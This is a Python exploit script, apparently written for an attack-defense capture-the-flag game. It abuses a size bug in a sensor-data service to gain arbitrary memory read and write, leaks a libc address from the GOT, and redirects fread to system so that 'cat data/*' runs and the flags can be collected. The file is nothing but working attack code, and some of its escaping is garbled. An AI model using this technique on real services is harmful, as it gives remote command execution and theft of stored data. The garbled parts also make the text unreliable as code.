#"'!/usr/bin/env python3
import socket, struct, re, argparse

PUTS_GOT = 0x405008
FREAD_GOT = 0x405010
CMD_ADDR = 0x405300
PUTS_OFF = 0x77980
SYSTEM_OFF = 0x4C490


def recvuntil(sock, token):
    data = b""
    while token not in data:
        chunk = sock.recv(1)
        if not chunk:
            raise EOFError("connection closed")
        data += chunk
    return data


def sendline(sock, x):
    if isinstance(x, int):
        x = str(x).encode()
    elif isinstance(x, str):
        x = x.encode()
    sock.sendall(x + b"'"\\n\")


def prepare_arb_rw(sock):
    recvuntil(sock, b\"> \")
    sendline(sock, 0)
    recvuntil(sock, b\"Enter the sector's size:\\n\")
    sendline(sock, \"9223372036854775807\")
    recvuntil(sock, b\"> \")


def arb_read_bytes(sock, addr, n):
    out = bytearray()
    for i in range(n):
        sendline(sock, 2)
        recvuntil(sock, b\"Where do you want to read?\\n\")
        sendline(sock, addr + i)
        recvuntil(sock, b\"How much do you want to read?\\n\")
        sendline(sock, 1)
        data = recvuntil(sock, b\"> \")
        out.extend(data[:1])
    return bytes(out)


def arb_write_bytes(sock, addr, data):
    sendline(sock, 1)
    recvuntil(sock, b\"Where do you want to write?\\n\")
    sendline(sock, addr)
    recvuntil(sock, b\"How much do you want to write?\\n\")
    sendline(sock, len(data))
    recvuntil(sock, b\"Enter your sensor data:\\n\")
    sock.sendall(data + b\"\\n\")
    recvuntil(sock, b\"> \")


def recover_flags(host, port):
    s = socket.create_connection((host, port), timeout=5)
    try:
        prepare_arb_rw(s)
        puts = struct.unpack(\"<Q\", arb_read_bytes(s, PUTS_GOT, 8))[0]
        system = puts - (PUTS_OFF - SYSTEM_OFF)
        arb_write_bytes(s, CMD_ADDR, b\"cat data/*;echo\\x00\")
        arb_write_bytes(s, FREAD_GOT, struct.pack(\"<Q\", system))

        sendline(s, 1)
        recvuntil(s, b\"Where do you want to write?\\n\")
        sendline(s, CMD_ADDR)
        recvuntil(s, b\"How much do you want to write?\\n\")
        sendline(s, 1)
        recvuntil(s, b\"Enter your sensor data:\\n\")
        s.sendall(b\"X\\n\")

        s.settimeout(1)
        all_data = b\"\"
        while True:
            try:
                chunk = s.recv(4096)
            except TimeoutError:
                break
            if not chunk:
                break
            all_data += chunk
    finally:
        s.close()

    text = all_data.decode(\"latin1\", \"ignore\")
    return sorted(set(re.findall(r\"FLAG\\{["'^}]+'"\\}\", text)))


if __name__ == \"__main__\":
    ap = argparse.ArgumentParser()
    ap.add_argument(\"--host\", default=\"team1_prod\")
    ap.add_argument(\"--port\", type=int, default=6666)
    args = ap.parse_args()

    flags = recover_flags(args.host, args.port)
    for f in flags:
        print(f)
